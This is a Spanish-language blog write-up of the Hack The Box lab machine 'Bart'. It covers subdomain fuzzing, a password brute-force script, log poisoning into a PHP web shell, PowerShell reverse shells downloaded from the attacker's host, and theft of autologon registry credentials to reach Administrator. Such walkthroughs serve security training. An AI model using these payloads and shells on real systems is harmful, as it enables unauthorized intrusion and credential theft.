---
layout: post
title: Bart
date: 2022-11-29
categories: ["HTB"]
thumbnail: "assets/images/Bart.png"
---

# Bart [ Hack The Box ]

### Reconocimiento

##### Descubrimiento de puertos y reconocimiento básico
- `nmap -sS --min-rate 5000 10.10.10.81 -oG allPorts`
- `nmap -sCV -p80 10.10.10.81 -oN targeted`

`NMAP` nos dice que no ha seguido el redireccionamiento a `http://forum.bart.htb`.

### Inspección #1

Una vez haymos agregado `bart.htb` y `forum.bart.htb` al archivo `/etc/hosts` podemos ver la página sin problema. Nos encontramos en una página de negocios y tecnología revolucionaria, al inspeccionar el código fuente vemos un comentario añadiendo a otro desarrollador y nos dice que no puede añadirlo, ya que el `CSS` se rompe, por lo que lo deja ahí.

No hay nada interesante, pero si nos fijamos vemos que estamos en un subdominio, así
que con WFuzz vamos a enumerar subdominios para descubrir si hay más.

- `wfuzz -w top1million-2000.txt -H "Host: FUZZ.bart.htb" -t 100 10.10.10.81`

Bien! Gracias a `WFuzz` hemos descubierto otro subdominio (`monitor.bart.htb`)! Nos dirigimos a la página para ver a lo que nos estamos enfrentando. Tenemos ante nosotros un panel `login` de `PHP Server Monitor`, no disponemos de ningún usuario válido y menos de una contraseña, pero vemos un botón para restaurar la contraseña, cuando lo clicamos no nos pide un correo, sino un nombre de usuario, por lo que vamos probando hasta que damos con el usuario `harvey`. En la página principal veíamos varias personas y en el código fuente a `Harvey`, por lo que podíamos intuir lo que había que hacer.

Ahora bien, seguimos sin tener ninguna contraseña, aunque para eso usaremos `CeWL`, una herramienta hecha en `Ruby` que nos permite crear `wordlists` customizadas, en este caso queremos que nos saque una `wordlist` de la página inicial.

- `cewl -w cewl-forum.txt -e -a http://forum.bart.htb`

Bien! Ya tenemos una `wordlist` customizada! Ahora hice un `script` en `Python` para probar todas las contraseñas de ese diccionario.

```
import requests

with open("cewl-forum.txt", "r") as wordlist:
    lines = wordlist.readlines()

    for passwd in lines:
        passwd = str(passwd).replace("\n", "").lower()
        cookies = {"PHPSESSID": "71793v7dsekogj5f3o0seo4341"}
        data = {
        "csrf": "999792d7ce[...]e511694927ca218",
        "user_name": "harvey",
        "user_password": f"{passwd}",
        "action": "login",
        }

        r = requests.post("http://monitor.bart.htb/", cookies=cookies, data=data)
        print(f"Harvey [ {passwd} ] | " + str(len(r.content)))
```

Como vemos en este `script` medimos la longitud de la respuesta, ya que si la contraseña es incorrecta siempre es la misma longitud, en cambio, cuando la longitud haya cambiado significará que la contraseña es correcta. Tras unos minutos hemos podido obtener la contrasña de Harvey (`harvey:potter`)!

### Inspección #2

Una vez estemos dentro del panel veremos varios apartados arriba, nos dirigimos a `Servers` y vemos otro subdominio, vamos a agregarlo al archivo `/etc/hosts`.

Una vez agregado entramos y vemos otro panel `login`, nos disponemos a `fuzzear` la página con `WFuzz` para encontrar archivos con extensión `PHP`.

- `wfuzz dir -u "http://internal-01.bart.htb/simple_chat/FUZZ.php" -w directory-list-2.3-medium.txt`

Gracias a esto vemos un archivo llamado `register.php`, investigando un poco más sobre `SimpleChat` vemos que es un proyecto de código abierto y está disponible en `GitHub`, por lo que mirando el código vemos que necesitamos dos parámetros (`uname` y `passwd`) y que la petición se tramita mediante `POST`, por lo que nos podemos crear un usuario tramitando una petición con `CURL`.

```
data="uname=black&passwd=password"
curl -X POST http://internal-01.bart.htb/simple_chat/register.php -d "$data"
```
Bien! Hemos creado un usuario! Ahora podemos acceder al panel para poder continuar. Es simplemente un chat, vemos mensajes pero no son relevantes, lo importante está en el código fuente, el cual está algo cambiado respecto al original, añadiendo así un pequeño `script`:

```
<div id="log_link">
  <script>
    function saveChat() {
      // Create a serialized object and send to log_chat.php.
      // Once done the XHR request, alert "Done"
      var xhr = new XMLHttpRequest();
      xhr.onreadystatechange = function() {
        if (xhr.readyState == XMLHttpRequest.DONE) {
          alert(xhr.responseText);
        }
      }
      xhr.open('GET', 'http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey', true);
      xhr.send(null);
      alert("Done");
    }
  </script>
  <a href="#" onclick="saveChat()">Log</a>
</div>
```

Cuando el usuario clica el link Log ejecuta la función `SaveChat`, la cual hará saltar una ventana diciendo `Done` y luego otra diciendo `1`. Eso es debido a que la función `xhr.open` es llamada con el tercer parámetro `true`, que pone la llamada al modo `async`. El `script` dice `Done` y luego, una vez la petición regresa, la función `xhr.onreadystatechange` es llamada, alertando así del texto con la respuesta.

Si nos vamos manuealmente a la URL veremos un código de estado `1`, pero si cambiamos el nombre de usuario vemos `0`. Hay un parámetro llamado `filename`, el cual tiene como valor `log.txt`, entramos `http://internal-01.bart.htb/log/log.txt` y vemos que existe, por lo que me hace pensar que se está creando un archivo el cual muestra nuestro `User-Agent`.

Con esto en cuenta nos acordamos del `Log Poisoning` o `Envenenamiento de Registros`, así que vamos a probarlo. Para ello cambiaré mi User-Agent a `<?php phpinfo(); ?>` para que cuando cargue nos interprete el `PHP` y podamos ver la información de `PHP`.

```
import requests

headers = {'User-Agent':'<?php phpinfo(); ?>'}
r = requests.get('http://internal-01.bart.htb/log/log.php?filename=phpinfo.php&username=harvey', headers=headers)
```

Una vez ejecutado el script nos dirigimos a `http://internal-01.bart.htb/log/phpinfo.php` y podremos ver que la inyección ha salido bien, por lo que ahora podemos crear otro archivo pero que tome el parámetro cmd para ejecutar el comando a nivel de sistema y representar el resultado, para ello cambiaremos el `User- Agent` a `<?php system($_REQUEST['cmd']); ?>`.

Bien! Ya podemos ejecutar comandos a nivel de sistema!

### Shell

Para obtener una Shell me descargué un archivo `PS1` llamado [`Invoke-PowerShellTcp.ps1`](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) del
repositorio [`Nishang`](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1).

Una vez lo tenía de manera local le añadí al final una línea para poder entablarnos la conexión y me puse en escucha con `NC`.

- `Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.15 -Port 4444`
- `nc -nlvp 4444`

Bien! Ya estamos preparados para obtener la Shell! De nuevo usaremos `Python` para montarnos un servidor y mandar la petición de una manera más cómoda.

- `python3 -m http.server 80`

```
import requests

cmd = "powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.15/Invoke-PowerShellTcp.ps1')"
r = requests.get('http://internal-01.bart.htb/log/black.php?cmd={}'.format(cmd))
```

Bien! Hemos recibido la conexión! Ya estamos en la máquina como `IUSR`!


### Subida de privilegios

Ahora que estamos en la máquina hay que intentar ser administradores, para ello comenzé con pruebas estándar para la subida de privilegios en `Windows`. Tras estar probando encontré credenciales por defecto en los registros de `autologon`.

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
```

```
DefaultDomainName REG_SZ DESKTOP-7I3S68E
DefaultUserName REG_SZ Administrator
DefaultPassword REG_SZ 3130438 f31186fbaf962f407711faddb
```

Para obtener la Shell como `Administrator` edité el `script` que habíamos utilizando anteriormente cambiándole el puerto a `443`, una vez hecho eso me puse en escucha, me monté un servidor en `Python` y pasé a hacer lo siguiente:

```
$username = "BART\Administrator"
$password = "3130438f31186fbaf962f407711faddb"
$secstr = New-Object -TypeName System.Security.SecureString
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
$cred = new-object -typename System.Management.Automation.PSCredential -
argumentlist $username, $secstr
Invoke-Command -ScriptBlock { IEX(New-Object
Net.WebClient).downloadString('http://10.10.14.15/Shell.ps1') } -Credential $cred
-Computer localhost
```

Enhorabuena! Ya estamos como `bart\administrator` en la máquina! Vaya desafío!